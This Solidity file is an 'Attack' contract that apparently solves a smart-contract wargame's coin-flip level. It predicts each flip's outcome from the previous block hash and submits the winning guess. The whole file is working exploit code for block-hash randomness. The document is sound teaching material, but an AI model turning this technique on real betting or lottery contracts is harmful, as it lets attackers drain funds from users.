// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

interface CoinFlip {
    function flip(bool _guess) external returns (bool);
}

contract Attack {
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
    address public target;

    constructor(address _target) {
        target = _target;
    }

    function attack() public {
        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;
        CoinFlip(target).flip(side);
    }
}